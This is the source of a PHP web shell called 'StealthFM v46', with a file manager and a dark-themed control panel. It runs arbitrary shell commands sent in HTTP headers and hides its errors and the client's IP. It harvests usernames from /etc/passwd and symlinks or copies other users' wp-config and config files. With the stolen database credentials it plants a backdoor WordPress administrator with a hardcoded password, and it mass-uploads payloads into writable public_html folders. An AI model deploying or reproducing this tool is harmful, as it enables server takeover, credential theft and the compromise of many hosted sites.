<?php
// -------------------------------------------------------------------------
// STEALTH FM V46 (FINAL COMPLETE: BASE V45 + AUTO RESET)
// -------------------------------------------------------------------------

// 1. STEALTH MODE
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('error_log', NULL);
@set_time_limit(0);

// 2. IP CLOAKING
function cloak_headers() {
    $fake_ip = "127.0.0.1"; 
    $headers = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'];
    foreach ($headers as $key) {
        if (isset($_SERVER[$key])) $_SERVER[$key] = $fake_ip;
        putenv("$key=$fake_ip");
    }
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Pragma: no-cache");
    header("Expires: Wed, 11 Jan 1984 05:00:00 GMT");
}
cloak_headers();

if (isset($_GET['do_phpinfo'])) { phpinfo(); exit; }

$h_act   = 'HTTP_X_ACTION';
$h_path  = 'HTTP_X_PATH';
$h_data  = 'HTTP_X_DATA'; 
$h_cmd   = 'HTTP_X_CMD';
$h_tool  = 'HTTP_X_TOOL';
$h_step  = 'HTTP_X_STEP'; 
$h_enc   = 'HTTP_X_ENCODE'; 
$h_mmode = 'HTTP_X_MASS_MODE'; 

$root = realpath(__DIR__); 

function get_sys_info() {
    $u_id = function_exists('posix_getpwuid') ? posix_getpwuid(getmyuid()) : ['name' => get_current_user(), 'gid' => getmygid()];
    $curl_v = function_exists('curl_version') ? curl_version()['version'] : 'N/A';
    $safe_mode = (ini_get('safe_mode') == 1 || strtolower(ini_get('safe_mode')) == 'on') ? "<span style='color:#f28b82'>ON</span>" : "<span style='color:#81c995'>Off</span>";
    return [
        'os' => php_uname(),
        'user' => getmyuid() . ' (' . $u_id['name'] . ')',
        'safe' => $safe_mode,
        'ip' => $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']),
        'soft' => $_SERVER['SERVER_SOFTWARE'],
        'php' => phpversion(),
        'curl' => $curl_v,
        'time' => date('Y-m-d H:i:s')
    ];
}
$sys = get_sys_info();

function x_read($path) {
    if (is_readable($path)) return @file_get_contents($path);
    if (function_exists('shell_exec')) return @shell_exec("cat '$path'");
    return false;
}
function x_write($path, $data) {
    if (@file_put_contents($path, $data)) return true;
    if (function_exists('fopen')) { $h = @fopen($path, "w"); if ($h) { fwrite($h, $data); fclose($h); return true; } }
    return false;
}
function x_link($target, $link) {
    if (function_exists('symlink')) @symlink($target, $link);
    elseif (function_exists('shell_exec')) @shell_exec("ln -s '$target' '$link'");
}
function get_home_dirs() {
    $d = ['/home']; for ($i = 1; $i <= 9; $i++) $d[] = '/home' . $i; return $d;
}
function force_delete($target) {
    if (is_file($target)) return unlink($target);
    if (is_dir($target)) {
        $files = array_diff(scandir($target), array('.','..'));
        foreach ($files as $file) force_delete("$target/$file");
        $try = rmdir($target); if ($try) return true;
        if (function_exists('shell_exec')) { @shell_exec("rm -rf " . escapeshellarg($target)); return !file_exists($target); }
        return false;
    }
}
function json_out($data) { header('Content-Type: application/json'); echo json_encode($data); exit; }
function human_filesize($bytes, $dec = 2) {
    $size = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$dec}f", $bytes / pow(1024, $factor)) . @$size[$factor];
}

// --- V45 SMART SCANNER ---
function scan_smart_targets($base_dir) {
    $targets = [];
    $items = @scandir($base_dir);
    if ($items) {
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $path = $base_dir . '/' . $item;
            if (is_dir($path)) {
                if (is_writable($path)) $targets[] = $path;
                $pub = $path . '/public_html';
                if (is_dir($pub) && is_writable($pub)) {
                    $targets[] = $pub;
                }
            }
        }
    }
    return $targets;
}

if (isset($_SERVER[$h_act])) {
    $action = $_SERVER[$h_act];
    $raw_path = isset($_SERVER[$h_path]) ? base64_decode($_SERVER[$h_path]) : '';
    
    if ($raw_path === '__HOME__') { $target = getcwd(); } 
    elseif ($raw_path === '') { $target = getcwd(); } 
    else { $target = $raw_path; }
    
    $target = str_replace('\\', '/', $target);
    if(strlen($target) > 1) $target = rtrim($target, '/');

    if(is_dir($target)) @chdir($target); elseif(is_file($target)) @chdir(dirname($target));

    if ($action === 'list') {
        if (!is_dir($target)) { $target = getcwd(); }
        $items = @scandir($target);
        if ($items === false) { json_out(['path' => $target, 'items' => [], 'error' => 'Unreadable']); }

        $dirs = []; $files = [];
        foreach ($items as $i) {
            if ($i == '.' || $i == '..') continue;
            $path = $target . '/' . $i; 
            $isDir = is_dir($path);
            $item = [
                'name'=>$i, 
                'type'=>$isDir?'dir':'file', 
                'size'=>$isDir?'-':human_filesize(@filesize($path)), 
                'perm'=>substr(sprintf('%o', @fileperms($path)),-4), 
                'write'=>is_writable($path), 
                'date'=>date("Y-m-d H:i", @filemtime($path))
            ];
            if ($isDir) $dirs[] = $item; else $files[] = $item;
        }
        usort($dirs, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
        usort($files, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
        json_out(['path' => $target, 'items' => array_merge($dirs, $files)]);
    }

    if ($action === 'read') { if (is_file($target)) echo file_get_contents($target); else echo "Err: Not a file"; exit; }
    
    // --- V42: DECODE B64 INPUT ---
    if ($action === 'save' || $action === 'upload') { 
        $input = file_get_contents("php://input"); 
        if (isset($_SERVER[$h_enc]) && $_SERVER[$h_enc] === 'b64') {
            $input = base64_decode($input);
        }
        echo (file_put_contents($target, $input) !== false) ? "Success" : "Err: Write failed"; 
        exit; 
    }

    if ($action === 'delete') { echo force_delete($target) ? "Deleted" : "Fail delete"; exit; }
    if ($action === 'rename') { $n = isset($_SERVER[$h_data]) ? base64_decode($_SERVER[$h_data]) : ''; if ($n) echo rename($target, dirname($target).'/'.$n) ? "Renamed" : "Fail"; exit; }
    if ($action === 'chmod') { $m = isset($_SERVER[$h_data]) ? $_SERVER[$h_data] : ''; if ($m) echo chmod($target, octdec($m)) ? "Chmod OK" : "Fail"; exit; }
    
    // --- V42: POLYGLOT CMD ---
    if ($action === 'cmd') {
        $cmd = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami'; 
        $cmd_exec = $cmd . " 2>&1";
        $out = ""; 
        if (function_exists('proc_open')) {
            $descriptors = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
            $process = proc_open($cmd, $descriptors, $pipes, $target); 
            if (is_resource($process)) {
                fclose($pipes[0]); 
                $out .= stream_get_contents($pipes[1]); 
                $out .= stream_get_contents($pipes[2]); 
                fclose($pipes[1]); fclose($pipes[2]);
                proc_close($process);
            }
        }
        if (empty($out)) {
            if(function_exists('shell_exec')) { $out = @shell_exec($cmd_exec); }
            elseif(function_exists('passthru')) { ob_start(); @passthru($cmd_exec); $out = ob_get_clean(); }
            elseif(function_exists('exec')) { $a=[]; @exec($cmd_exec,$a); $out = implode("\n",$a); }
            elseif(function_exists('popen')) { $h=@popen($cmd_exec,'r'); if($h){ while(!feof($h))$out.=fread($h,1024); pclose($h); } }
            elseif(function_exists('system')) { ob_start(); @system($cmd_exec); $out = ob_get_clean(); }
        }
        if (empty($out) || strlen(trim($out)) === 0) {
            $disabled = ini_get('disable_functions');
            $out = "[No Output]\n\n--- DEBUG INFO ---\nUser: " . get_current_user() . "\nDisabled Functions: " . ($disabled ? $disabled : "NONE") . "\nShell_exec: " . (function_exists('shell_exec') ? "YES" : "NO") . "\nProc_open: " . (function_exists('proc_open') ? "YES" : "NO");
        }
        echo $out; exit;
    }

    if ($action === 'tool') {
        $tool = isset($_SERVER[$h_tool]) ? $_SERVER[$h_tool] : '';
        $home_dirs = get_home_dirs();

        // --- V45: FIXED MASS UPLOAD PROTOCOL ---
        if ($tool === 'mass_upload') {
            $mode = isset($_SERVER[$h_mmode]) ? $_SERVER[$h_mmode] : 'init';
            $tmp_list = sys_get_temp_dir() . "/sfm_mass_targets.json";
            $tmp_file = sys_get_temp_dir() . "/sfm_mass_payload.tmp";

            if ($mode === 'init') {
                $input = file_get_contents("php://input");
                if (isset($_SERVER[$h_enc]) && $_SERVER[$h_enc] === 'b64') $input = base64_decode($input);
                file_put_contents($tmp_file, $input);
                $targets = scan_smart_targets($target); 
                file_put_contents($tmp_list, json_encode($targets));
                json_out(['status' => 'ready', 'total' => count($targets)]);
            }
            
            if ($mode === 'process') {
                $step = isset($_SERVER[$h_step]) ? (int)$_SERVER[$h_step] : 0;
                $filename = isset($_SERVER[$h_data]) ? base64_decode($_SERVER[$h_data]) : 'mass_file.php';
                $limit = 20; 

                if (!file_exists($tmp_list) || !file_exists($tmp_file)) { json_out(['status'=>'error', 'msg'=>'Task expired.']); }
                
                $targets = json_decode(file_get_contents($tmp_list), true);
                $total = count($targets);
                
                if ($total === 0 || $step >= $total) {
                    @unlink($tmp_list); @unlink($tmp_file); 
                    json_out(['status' => 'done', 'total' => $total]);
                }

                $batch = array_slice($targets, $step, $limit);
                $payload = file_get_contents($tmp_file);
                $count_ok = 0;

                foreach($batch as $dir) {
                    if(@file_put_contents($dir . '/' . $filename, $payload)) $count_ok++;
                }

                $next_step = $step + $limit;
                json_out(['status' => 'continue', 'next_step' => $next_step, 'total' => $total, 'ok_batch' => $count_ok]);
            }
            exit;
        }
        
        if ($tool === 'bypass_user') {
            $found = ""; $etc = x_read("/etc/passwd");
            if ($etc) { $lines = explode("\n", $etc); foreach($lines as $l) { $p = explode(":", $l); if(isset($p[0]) && !empty($p[0])) $found .= $p[0] . ":\n"; } } 
            else { for ($userid = 0; $userid < 2000; $userid++) { $arr = posix_getpwuid($userid); if (!empty($arr) && isset($arr['name'])) $found .= $arr['name'] . ":\n"; } }
            if(!empty($found)) { x_write("passwd.txt", $found); echo "Saved to: passwd.txt\nTotal Found: " . count(explode("\n", trim($found))); } else echo "Failed."; exit;
        }

        // --- FULL ADD ADMIN LOGIC (V42/V45) ---
        if ($tool === 'add_admin') {
            $step = isset($_SERVER[$h_step]) ? (int)$_SERVER[$h_step] : 0;
            $limit = 5; 
            $scan_path = is_dir($target . '/jumping') ? $target . '/jumping' : $target;
            $all_files = scandir($scan_path);
            $config_files = [];
            foreach($all_files as $f) { if($f == '.' || $f == '..') continue; if(stripos($f, 'config') !== false || stripos($f, 'settings') !== false) $config_files[] = $scan_path . '/' . $f; }
            $total = count($config_files);
            if ($step >= $total) { echo json_encode(['status'=>'done', 'html'=>'', 'total'=>$total]); exit; }
            $batch_files = array_slice($config_files, $step, $limit);
            $html_log = "";

            foreach($batch_files as $file) {
                $content = x_read($file);
                if(!$content) continue;
                if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_name)) {
                    $db_name = $m_name[1];
                    preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_user); $db_user = $m_user[1] ?? '';
                    preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_pass); $db_pass = $m_pass[1] ?? '';
                    preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_host); $db_host = $m_host[1] ?? 'localhost';
                    preg_match("/table_prefix\s*=\s*['\"](.*?)['\"]/", $content, $m_pre); $pre = $m_pre[1] ?? 'wp_';
                    
                    $new_u = "xshikata"; $new_p_raw = "Wh0th3h3llAmi"; $new_p_hash = md5($new_p_raw);
                    
                    $link = mysqli_init(); mysqli_options($link, MYSQLI_OPT_CONNECT_TIMEOUT, 3);
                    $con = @mysqli_real_connect($link, $db_host, $db_user, $db_pass, $db_name);
                    if (!$con && $db_host == 'localhost') { $link = mysqli_init(); mysqli_options($link, MYSQLI_OPT_CONNECT_TIMEOUT, 3); $con = @mysqli_real_connect($link, '127.0.0.1', $db_user, $db_pass, $db_name); }

                    if ($con) {
                        $site_url = ""; $q = @mysqli_query($link, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl' LIMIT 1");
                        if ($q && $r = @mysqli_fetch_assoc($q)) $site_url = $r['option_value'];
                        $disp_url = parse_url($site_url, PHP_URL_HOST); if(!$disp_url) $disp_url = $site_url;
                        
                        $st_txt = "CREATED"; $st_cls = "created"; 
                        $chk = @mysqli_query($link, "SELECT ID FROM {$pre}users WHERE user_login='$new_u'");
                        if ($chk && @mysqli_num_rows($chk) > 0) {
                            $old = @mysqli_fetch_assoc($chk); @mysqli_query($link, "DELETE FROM {$pre}users WHERE ID = " . $old['ID']); @mysqli_query($link, "DELETE FROM {$pre}usermeta WHERE user_id = " . $old['ID']); $st_txt = "REPLACED"; $st_cls = "replaced";
                        }
                        $ins = @mysqli_query($link, "INSERT INTO {$pre}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES ('$new_u', '$new_p_hash', '$new_u', 'admin@admin.com', NOW(), 0, '$new_u')");
                        if ($ins) {
                            $uid = @mysqli_insert_id($link); @mysqli_query($link, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')"); @mysqli_query($link, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}user_level', '10')");
                            $html_log .= "<div class='inj-card'><div class='inj-header'><span class='inj-status $st_cls'>$st_txt</span><span class='inj-domain'>$disp_url</span></div><div class='inj-body'><form action='$site_url/wp-login.php' method='post' target='_blank' style='margin:0;'><input type='hidden' name='log' value='$new_u'><input type='hidden' name='pwd' value='$new_p_raw'><button class='inj-btn'><i class='fas fa-sign-in-alt'></i> LOGIN</button></form><div class='inj-creds'>U: $new_u | P: $new_p_raw</div></div></div>";
                        }
                        @mysqli_close($link);
                    }
                }
            }
            $next_step = $step + $limit;
            if ($next_step < $total) { echo json_encode(['status'=>'continue', 'next_step'=>$next_step, 'html'=>$html_log, 'total'=>$total, 'current'=>$next_step]); } 
            else { echo json_encode(['status'=>'done', 'html'=>$html_log, 'total'=>$total]); }
            exit;
        }

        if ($tool === 'symlink_cage' || $tool === 'jumper_cage') {
            $c = x_read(getcwd()."/passwd.txt"); if(!$c) { echo "Err: passwd.txt missing."; exit; }
            $users = explode("\n", $c); $dir=($tool==='symlink_cage')?"3x_sym":"jumping"; @mkdir($dir,0755); chdir($dir);
            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex x\nAddType txt .php\nAddHandler txt .php");
            $list = ["wp-config.php","config.php","configuration.php"]; $n=0;
            foreach ($users as $u_str) {
                $u=explode(":",$u_str)[0]; if(!$u) continue;
                foreach ($home_dirs as $h) {
                    foreach ($list as $f) {
                        if($tool==='symlink_cage') x_link("$h/$u/public_html/$f", "$u~".str_replace("/","-",$f).".txt");
                        else { $dat=x_read("$h/$u/public_html/$f"); if($dat) x_write("$u~".str_replace("/","",$h)."~".str_replace("/","-",$f).".txt", $dat); }
                        $n++;
                    }
                }
            }
            echo "$tool Done. Count: $n."; exit;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>StealthFM v46</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/ace.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <style>
        /* TURBO TRANSITIONS */
        * { transition: border-color 0.1s ease, background-color 0.1s ease, color 0.1s ease, box-shadow 0.1s ease; }

        :root {
            --bg-body: #131314; --bg-card: #1e1f20; --bg-hover: #2d2e30; 
            --border-color: #333333; --text-primary: #e3e3e3; --text-secondary: #a8a8a8;
            --accent-primary: #8ab4f8; --accent-warning: #fdd663;
            --accent-success: #81c995; --accent-danger: #f28b82; --accent-purple: #d946ef;
        }

        body { background-color: var(--bg-body); color: var(--text-primary); font-family: 'Inter', sans-serif; font-size: 0.9rem; padding-bottom: 60px; }

        .navbar { background-color: var(--bg-body); border-bottom: 1px solid var(--border-color); height: 60px; }
        .navbar-brand { font-weight: 700; color: #fff !important; font-size: 1.1rem; }
        .path-wrapper { margin-top: 80px; margin-bottom: 20px; }
        
        /* ANIMATED GHOST */
        .fa-ghost { animation: float 3s ease-in-out infinite; }
        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-5px); } 100% { transform: translateY(0px); } }

        .sys-info-box {
            background: #18191a; border: 1px solid var(--border-color); border-radius: 12px;
            padding: 15px; margin-bottom: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: #ccc;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        .sys-row { margin-bottom: 5px; word-break: break-all; }
        .sys-val { color: var(--accent-primary); }
        .sys-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 5px; margin-top: 5px; }
        .php-link { color: var(--accent-warning); text-decoration: none; font-weight: bold; margin-left: 5px; }
        .php-link:hover { text-decoration: underline; color: #fff; }

        #terminal-panel {
            background: #000; border: 1px solid #333; border-bottom: none; border-radius: 12px 12px 0 0;
            overflow: hidden; box-shadow: 0 -5px 20px rgba(0,0,0,0.5); margin-bottom: 0; animation: slideDown 0.15s ease;
        }
        .term-header { background: #1a1a1a; padding: 8px 15px; border-bottom: 1px solid #333; border-top: 2px solid var(--accent-success); display: flex; justify-content: space-between; align-items: center; }
        .term-title { font-family: 'JetBrains Mono'; font-weight: 700; color: var(--accent-success); font-size: 0.8rem; }
        .term-body-inline { height: 180px; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono'; font-size: 13px; color: #ddd; }
        .term-input-row { display: flex; align-items: center; border-top: 1px solid #222; padding: 10px; background: #0a0a0a; }
        .term-prompt { color: #c586c0; font-weight: bold; margin-right: 8px; }
        #term-cmd-inline { background: transparent; border: none; color: #ce9178; width: 100%; outline: none; font-family: 'JetBrains Mono'; }

        #process-panel { border: 1px solid var(--border-color); border-bottom: none; border-radius: 12px 12px 0 0; overflow: hidden; background: #1e1f20; margin-bottom: 0; }
        .console-header { background: #252627; padding: 8px 15px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
        .console-title { font-size: 0.75rem; font-weight: 700; color: var(--accent-warning); letter-spacing: 0.5px; text-transform: uppercase; }
        .panel-close { color: #666; cursor: pointer; } .panel-close:hover { color: #fff; }

        .path-bar-custom {
            background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 15px; padding: 10px 20px;
            display: flex; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.15); position: relative; z-index: 5;
        }
        .has-panel-above { border-top-left-radius: 0; border-top-right-radius: 0; border-top: 1px solid #333; }
        #path-txt { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

        /* UPLOAD STYLING */
        .input-group { border: 1px solid #333; border-radius: 8px; overflow: hidden; }
        #uploadInput { background: #111; color: #ccc; border: none; font-size: 0.85rem; }
        #uploadInput::file-selector-button { background-color: #000; color: #fff; border: none; border-right: 1px solid #333; padding: 8px 12px; margin-right: 10px; font-weight: 600; transition: 0.2s; }
        #uploadInput::file-selector-button:hover { background-color: #222; }
        .btn-upload-modern { background: #000 !important; border: none; border-left: 1px solid #333; color: #fff !important; font-weight: 600; padding: 6px 16px; }
        .btn-upload-modern:hover { background: #1a1a1a !important; }

        .btn-modern { border-radius: 8px; border: 1px solid var(--border-color); background: var(--bg-card); color: var(--text-primary); padding: 6px 12px; }
        .btn-modern:hover { background: var(--bg-hover); color: #fff; border-color: #555; }
        
        /* MATCH UP ICON SIZE */
        .btn-icon-path { 
            background: transparent; border: none; color: #aaa; padding: 0 10px 0 0; 
            font-size: 1.1rem; /* Same as icon-dir */
            cursor: pointer; transition: 0.2s; 
        }
        .btn-icon-path:hover { color: #fff; transform: translateY(-1px); }

        .card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; }
        .table { --bs-table-bg: transparent; color: var(--text-primary); margin: 0; table-layout: fixed; width: 100%; }
        .table thead th { background: var(--bg-card); color: var(--text-secondary); border-bottom: 1px solid var(--border-color); padding: 15px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.5px; vertical-align: middle; }
        .table tbody td { border-bottom: 1px solid var(--border-color); padding: 10px 15px; vertical-align: middle; height: 45px; }
        .table-hover tbody tr:hover { background-color: var(--bg-hover); }

        .icon-dir { color: var(--accent-warning); margin-right: 10px; font-size: 1.1rem; vertical-align: middle; }
        .icon-file { margin-right: 10px; font-size: 1.1rem; vertical-align: middle; } 
        .i-php { color: #8892bf; } .i-html { color: #e34f26; } .i-css { color: #264de4; } .i-js { color: #f7df1e; } 
        .i-img { color: #a29bfe; } .i-zip { color: #fdcb6e; } .i-code { color: #b2bec3; } .i-def { color: var(--accent-primary); } 

        .text-folder { color: #fff; font-weight: 600; text-decoration: none; vertical-align: middle; }
        .text-file { color: #b0b0b0; text-decoration: none; vertical-align: middle; }
        
        .badge-perm { 
            font-family: 'JetBrains Mono'; padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; 
            border: 1px solid var(--border-color); background: #000; color: var(--text-secondary); 
            display: inline-block; vertical-align: middle;
        }
        .writable { color: var(--accent-success); border-color: var(--accent-success); }
        .readonly { color: var(--accent-danger); border-color: var(--accent-danger); }
        
        .action-btn { 
            width: 32px; height: 32px; border-radius: 6px; border: 1px solid transparent; background: transparent; 
            display: inline-flex; align-items: center; justify-content: center; vertical-align: middle;
        }
        .action-btn.edit { color: #3b82f6; background: rgba(59, 130, 246, 0.1); border-color: rgba(59, 130, 246, 0.2); }
        .action-btn.edit:hover { background: #3b82f6; color: #fff; }
        .action-btn.del { color: #ef4444; background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.2); }
        .action-btn.del:hover { background: #ef4444; color: #fff; }

        .modal-xl { max-width: 95% !important; }
        .modal-content { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; }
        .modal-header { border-bottom: 1px solid var(--border-color); }
        .btn-close { filter: invert(1); }
        #editor-container { position: relative; width: 100%; height: 85vh; border-radius: 0 0 12px 12px; overflow: hidden; }
        
        .tools-list { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .tool-cmd { background: #111; border: 1px solid #2a2a2a; border-radius: 4px; padding: 15px 15px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; text-decoration: none; }
        .tool-cmd:hover { background: #161616; border-color: #444; transform: translateX(2px); }
        .cmd-left { display: flex; align-items: center; gap: 12px; }
        .cmd-icon { font-size: 16px; width: 20px; text-align: center; }
        .cmd-text { font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 0.85rem; color: #eee; }
        .cmd-arrow { color: #444; font-size: 12px; opacity: 0; }
        .tool-cmd:hover .cmd-arrow { opacity: 1; transform: translateX(-5px); color: #fff; }
        .c-cyan { color: #22d3ee; } .c-lime { color: #a3e635; } .c-gold { color: #facc15; } .c-rose { color: #fb7185; } .c-purple { color: #d946ef; }

        .inj-card { background: #000; border: 1px solid var(--border-color); border-left: 3px solid var(--border-color); padding: 12px; border-radius: 6px; margin-bottom: 10px; }
        .inj-card:hover { border-left-color: var(--accent-success); border-color: #444; }
        .inj-status { font-family: 'JetBrains Mono'; font-size: 0.7rem; padding: 3px 8px; border-radius: 4px; font-weight: bold; }
        .inj-status.created { color: var(--accent-success); border: 1px solid var(--accent-success); background: rgba(129, 201, 149, 0.1); }
        .inj-status.replaced { color: var(--accent-warning); border: 1px solid var(--accent-warning); background: rgba(253, 214, 99, 0.1); }
        .inj-btn { background: var(--accent-success); color: #000; padding: 4px 12px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; border: none; }
        
        /* TOAST */
        #toast-container { position: fixed; top: 80px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
        .toast-msg {
            background: #1e1f20; color: #fff; padding: 12px 18px; border-radius: 8px;
            border-left: 4px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
            font-size: 0.9rem; min-width: 250px; opacity: 0; transform: translateX(20px);
            animation: toastIn 0.3s forwards;
        }
        .toast-msg.success { border-left-color: var(--accent-success); }
        .toast-msg.error { border-left-color: var(--accent-danger); }
        .toast-msg.hiding { animation: toastOut 0.3s forwards; }
        
        /* MODERN FOOTER V40 */
        .cyber-footer {
            position: fixed; bottom: 0; left: 0; width: 100%;
            background: rgba(10, 10, 10, 0.85);
            backdrop-filter: blur(5px);
            border-top: 1px solid #222;
            padding: 8px 20px;
            display: flex; justify-content: space-between; align-items: center;
            font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: #555;
            z-index: 9999;
        }
        .cyber-footer span { transition: 0.3s; }
        .cyber-footer:hover span { color: #888; }
        .cy-brand { color: var(--accent-primary); font-weight: 700; letter-spacing: 1px; }
        
        /* HEART ANIMATION */
        .fa-heart { color: #e91e63; animation: heartbeat 1.5s infinite; }
        @keyframes heartbeat { 0% { transform: scale(1); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }
        
        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes toastIn { to { opacity: 1; transform: translateX(0); } }
        @keyframes toastOut { to { opacity: 0; transform: translateX(20px); } }
        
        /* V44+ ASYNC WIDGET */
        #async-widget {
            position: fixed; bottom: 50px; right: 20px; width: 300px; z-index: 10000;
            background: #111; border: 1px solid #333; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.5);
            display: none; font-family: 'JetBrains Mono';
        }
        .aw-header { padding: 10px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; font-size: 0.8rem; font-weight: bold; color: var(--accent-primary); }
        .aw-body { padding: 12px; }
        .progress-bar-bg { width: 100%; height: 6px; background: #222; border-radius: 3px; overflow: hidden; margin-bottom: 8px; }
        .progress-bar-fill { height: 100%; background: var(--accent-success); width: 0%; transition: width 0.3s ease; }
        .aw-stat { font-size: 0.7rem; color: #888; display: flex; justify-content: space-between; }
        
        @media (max-width: 768px) { 
            .desktop-toolbar { flex-direction: column; gap: 10px; } .upload-group { width: 100%; max-width: 100%; } 
            .d-mobile-none { display: none !important; } .tools-list { grid-template-columns: 1fr; } 
            .table th:first-child, .table td:first-child { padding-left: 8px !important; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
            .table th:nth-child(3), .table td:nth-child(3) { width: 65px; text-align: center; padding: 10px 2px !important; white-space: nowrap; }
            .table th:last-child, .table td:last-child { width: 90px; text-align: right; padding-right: 10px !important; white-space: nowrap; }
        }
    </style>
</head>
<body>

<nav class="navbar fixed-top">
    <div class="container-fluid flex-nowrap gap-3">
        <a class="navbar-brand d-flex align-items-center me-0" href="#">
            <i class="fas fa-ghost me-2 text-white"></i>
            <span class="text-white">Stealth<span class="text-primary">FM</span></span>
        </a>
        <div class="d-flex gap-2">
            <button class="btn btn-modern" onclick="goHome()" title="Home"><i class="fas fa-home"></i></button>
            <button class="btn btn-modern" onclick="showNewFileModal()" title="New File" style="color:#fff"><i class="fas fa-file-circle-plus"></i></button>
            <button class="btn btn-modern" onclick="toggleTerm()" style="color:var(--accent-success)"><i class="fas fa-terminal"></i></button>
            <button class="btn btn-modern" onclick="openTools()" style="color:var(--accent-warning)"><i class="fas fa-skull"></i></button>
        </div>
    </div>
</nav>

<div id="toast-container"></div>

<div class="container-fluid path-wrapper">
    <div class="sys-info-box">
        <div class="sys-row" style="color:#eee; font-weight:bold; margin-bottom:8px;">System Info: <span class="sys-val"><?php echo $sys['os']; ?></span></div>
        <div class="sys-grid">
            <div>User: <span class="text-success fw-bold"><?php echo $sys['user']; ?></span></div>
            <div class="d-mobile-none">Group: <span class="text-secondary"><?php echo $sys['group']; ?></span></div>
            <div>Safe Mode: <?php echo $sys['safe']; ?> <a href="?do_phpinfo=1" target="_blank" class="php-link">[ PHP Info ]</a></div>
            <div>IP: <span class="text-info"><?php echo $sys['ip']; ?></span></div>
            <div>Software: <span class="text-secondary"><?php echo $sys['soft']; ?></span></div>
            <div>PHP Ver: <span class="text-success"><?php echo $sys['php']; ?></span></div>
            <div class="d-mobile-none">cURL: <span class="text-secondary"><?php echo $sys['curl']; ?></span></div>
            <div class="d-mobile-none">Time: <span class="text-warning"><?php echo $sys['time']; ?></span></div>
        </div>
    </div>

    <div id="terminal-panel" style="display:none;">
        <div class="term-header"><span class="term-title">ROOT@SHELL:~#</span><i class="fas fa-times panel-close" onclick="toggleTerm()"></i></div>
        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v46</div></div>
        <div class="term-input-row"><span class="term-prompt">&#10140;</span><input type="text" id="term-cmd-inline" placeholder="Type command..." autocomplete="off"></div>
    </div>
    <div id="process-panel" style="display:none;">
        <div class="console-header"><span class="console-title"><i class="fas fa-cog fa-spin me-2"></i> SYSTEM OUTPUT</span><i class="fas fa-times panel-close" onclick="closeLog()"></i></div>
        <div id="global-log" class="p-2 bg-black text-secondary" style="height:180px; overflow-y:auto; font-family:'JetBrains Mono'; font-size:0.75rem;"></div>
    </div>
    
